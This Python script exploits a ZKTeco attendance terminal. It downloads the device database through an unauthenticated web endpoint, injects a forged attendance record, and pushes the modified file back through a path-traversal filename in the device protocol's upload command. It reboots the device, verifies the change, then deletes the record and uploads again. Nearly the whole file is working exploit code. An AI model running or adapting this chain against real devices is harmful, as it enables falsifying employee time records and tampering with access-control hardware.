#!/usr/bin/env python3
"""
ZK INJECT + SELECTIVE DELETE TEST
=================================
Demonstrates:
1. Inject 1 ATTLOG with marker in CREATE_ID
2. Verify injection
3. DELETE WHERE CREATE_ID=marker (selective)
4. Upload again + reboot
5. Verify delete

Answers BS question: "does injecting on a device affect other users' ATTLOG?"
"""
import sys, os, time, struct, sqlite3, urllib.request, gzip, shutil
sys.path.insert(0, r'D:\chamcong\AttendanceSuite_Portable\python\Lib\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

from datetime import datetime
from zk import ZK
from struct import pack

DEVICE_IP = '172.16.0.214'   # May 3 (FW 6.60 Dec 9 2019) - port 4370
WEB_IP    = '172.16.254.202' # Web UI (CVE-2023-4587 source)
WORK_DIR  = r'D:\chamcong\zk_inject_workspace'

MARKER    = '🆕 EM VỪA INJECT'
PIN       = '1'
TS        = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')

def banner(msg):
    print('\n' + '=' * 70)
    print(msg)
    print('=' * 70)

def download_zkdb(web_ip, out_path):
    url = f'http://{web_ip}/form/DataApp?style=0'
    print(f'[*] Downloading {url} ...')
    with urllib.request.urlopen(url, timeout=60) as r:
        data = r.read()
    print(f'  Got {len(data)} bytes')
    gz_off = data.find(b'\x1f\x8b\x08')
    gz = gzip.decompress(data[gz_off:])
    sq_off = gz.find(b'SQLite format 3')
    tar_hdr = gz[:512]
    size_oct = tar_hdr[124:136].decode('ascii', errors='replace').strip('\x00')
    fsize = int(size_oct, 8)
    sq = gz[sq_off:sq_off + fsize]
    with open(out_path, 'wb') as f:
        f.write(sq)
    print(f'  Saved {len(sq)} bytes -> {out_path}')
    return sq

def send_cmd(conn, cmd, data=b''):
    try:
        return conn._ZK__send_command(cmd, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_zkdb(conn, data, chunk_size=32768):
    traversal = ('..' + chr(47)) * 7 + 'mnt/mtdblock/data/ZKDB.db'
    fn = traversal.encode() + b'\x00'
    sz = len(data)
    print(f'[1/3] PREPARE_DATA size={sz}')
    r1 = send_cmd(conn, 1500, pack('I', sz))
    if not r1.get('status'):
        return {'error': 'PREPARE fail', 'r1': r1}
    packets = sz // chunk_size
    remain = sz % chunk_size
    t0 = time.time()
    fails = []
    for i in range(packets):
        r = send_cmd(conn, 1501, data[i*chunk_size:(i+1)*chunk_size])
        if not r.get('status'):
            fails.append(i)
            if len(fails) > 5:
                return {'error': 'too many fails', 'failed': fails}
        if (i+1) % 50 == 0:
            print(f'  ...{i+1}/{packets}')
    if remain:
        send_cmd(conn, 1501, data[packets*chunk_size:])
    el = time.time() - t0
    print(f'  Upload {el:.1f}s ({sz/el/1024:.1f} KB/s)')
    print('[3/3] UPLOAD_PICTURE commit')
    r3 = send_cmd(conn, 0x272B, fn)
    return {'PREPARE': r1, 'UPLOAD': r3, 'fails': fails, 'time': el}

def get_attlog_count(conn):
    """Get ATTLOG count + recent records"""
    try:
        att = conn.get_attendance()
        return len(att), att[-5:] if att else []
    except Exception as e:
        return None, str(e)

# ========== MAIN FLOW ==========
banner(f'ZK INJECT+DELETE TEST | DEVICE: {DEVICE_IP} | PIN: {PIN} | MARKER: {MARKER}')
print(f'Target device : {DEVICE_IP} (May 3 - X628 PRO FW 6.60 Dec 9 2019)')
print(f'Web source    : {WEB_IP}')
print(f'Work dir      : {WORK_DIR}')
print(f'Inject time   : {TS}')
print(f'Marker (CREATE_ID) : {MARKER}')

# Step 0: Get baseline ATTLOG from device (read-only)
print('\n[*] Step 0: Baseline ATTLOG from device ...')
zk = ZK(DEVICE_IP, port=4370, timeout=30, password=0)
conn = zk.connect()
print(f'  FW: {conn.get_firmware_version()}')
print(f'  Serial: {conn.get_serialnumber()}')
print(f'  Platform: {conn.get_platform()}')
att_count_before, att_recent_before = get_attlog_count(conn)
print(f'  Total ATTLOG: {att_count_before}')
print(f'  Last 5 records:')
for r in att_recent_before:
    print(f'    {r}')

# Step 1: Download ZKDB.db from web
banner('STEP 1: Download clean ZKDB.db from Web UI')
os.makedirs(WORK_DIR, exist_ok=True)
db_path = os.path.join(WORK_DIR, 'current_zkdb.db')
download_zkdb(WEB_IP, db_path)

# Step 2: Inject ATTLOG with marker
banner('STEP 2: Inject ATTLOG record with marker')
db = sqlite3.connect(db_path)
cur = db.cursor()
count_before = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
print(f'  ATTLOG before injection: {count_before}')
cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
               VALUES (?, 1, ?, 0, 0, 0, 0, ?, NULL, 0)''', (PIN, TS, MARKER))
db.commit()
count_after = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
print(f'  ATTLOG after injection : {count_after}')
print(f'  Delta (this inject)    : +{count_after - count_before}')

# Show the injected record + last 5 to confirm OLD records preserved
injected = cur.execute('SELECT * FROM ATT_LOG WHERE CREATE_ID=?', (MARKER,)).fetchall()
print(f'  Injected record(s):')
for r in injected:
    print(f'    ID={r[0]} PIN={r[1]} Verify={r[2]} Time={r[3]} Status={r[4]} CREATE_ID={r[8]}')
print(f'  Last 5 records in DB (chronological):')
last5 = cur.execute('SELECT ID, User_PIN, Verify_Time, Status, CREATE_ID FROM ATT_LOG ORDER BY ID DESC LIMIT 5').fetchall()
for r in last5:
    marker = f' <<<<< {MARKER}' if r[4] == MARKER else ''
    print(f'    ID={r[0]:6d} PIN={r[1]:8s} Time={r[2]} Status={r[3]} CREATE_ID={r[4]}{marker}')
db.close()

# Step 3: Upload modified ZKDB.db to device
banner('STEP 3: Upload modified ZKDB.db (CVE-2023-3941)')
with open(db_path, 'rb') as f:
    modified = f.read()
print(f'  Modified DB size: {len(modified)} bytes')
try: conn.disable_device()
except: pass
try:
    result = upload_zkdb(conn, modified)
    print(f'  Upload result: {result}')
except Exception as e:
    print(f'  Upload err: {e}')

# Step 4: Reboot
print('\n[*] Step 4: Rebooting device ...')
try: conn.restart()
except Exception as e: print(f'  Restart err: {e}')
try: conn.disconnect()
except: pass

print('[*] Waiting 25s for reboot ...')
time.sleep(25)

# Step 5: Verify injection
banner('STEP 5: Verify injection after reboot')
zk2 = ZK(DEVICE_IP, port=4370, timeout=30, password=0)
try:
    conn2 = zk2.connect()
    print(f'  Reconnected. FW: {conn2.get_firmware_version()}')
    att_count_after, att_recent_after = get_attlog_count(conn2)
    print(f'  Total ATTLOG now: {att_count_after}')
    print(f'  Last 5 records:')
    for r in att_recent_after:
        print(f'    {r}')
    # Find our injected record
    found = False
    for r in att_recent_after:
        if hasattr(r, 'user_id') and MARKER in str(getattr(r, 'user_id', '')):
            found = True
            print(f'\n  *** INJECTED RECORD FOUND ***')
            break
    if not found:
        # Try checking via direct query
        print(f'\n  Checking ATTLOG for marker (any field)...')
        all_att = conn2.get_attendance()
        # Get last 10 records
        for r in all_att[-10:]:
            print(f'    {r}')
except Exception as e:
    print(f'  Reconnect err: {e}')

# Step 6: DELETE the injected record (selective)
banner(f'STEP 6: DELETE WHERE CREATE_ID="{MARKER}" (selective)')
db_path2 = os.path.join(WORK_DIR, 'after_inject_zkdb.db')
shutil.copy(db_path, db_path2)
db = sqlite3.connect(db_path2)
cur = db.cursor()
del_before = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
cur.execute('DELETE FROM ATT_LOG WHERE CREATE_ID = ?', (MARKER,))
deleted_n = cur.rowcount
db.commit()
del_after = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
print(f'  ATTLOG before delete: {del_before}')
print(f'  Records deleted      : {deleted_n}')
print(f'  ATTLOG after delete  : {del_after}')
print(f'  Net change           : {del_after - del_before}')
db.close()

# Step 7: Upload deleted ZKDB.db
banner('STEP 7: Upload deleted ZKDB.db')
with open(db_path2, 'rb') as f:
    modified2 = f.read()
try:
    zk3 = ZK(DEVICE_IP, port=4370, timeout=60, password=0)
    conn3 = zk3.connect()
    try: conn3.disable_device()
    except: pass
    result2 = upload_zkdb(conn3, modified2)
    print(f'  Upload result: {result2}')
    print('[*] Rebooting ...')
    try: conn3.restart()
    except: pass
    try: conn3.disconnect()
    except: pass
    time.sleep(25)
except Exception as e:
    print(f'  Upload err: {e}')

# Step 8: Verify delete
banner('STEP 8: Verify delete after reboot')
zk4 = ZK(DEVICE_IP, port=4370, timeout=30, password=0)
try:
    conn4 = zk4.connect()
    print(f'  Reconnected. FW: {conn4.get_firmware_version()}')
    final_count, final_recent = get_attlog_count(conn4)
    print(f'  Total ATTLOG now: {final_count}')
    print(f'  Last 5 records (delete should be gone):')
    for r in final_recent:
        print(f'    {r}')
    print(f'\n  Expected: count = {att_count_before} + 0 (injection deleted) = {att_count_before}')
    print(f'  Actual  : {final_count}')
    if final_count == att_count_before:
        print(f'\n  *** DELETE SUCCESS - back to baseline ***')
    elif final_count == att_count_before + 0:
        print(f'\n  *** DELETE SUCCESS ***')
    else:
        print(f'\n  Delta from baseline: {final_count - att_count_before}')
except Exception as e:
    print(f'  Reconnect err: {e}')

print('\n[+] Test complete')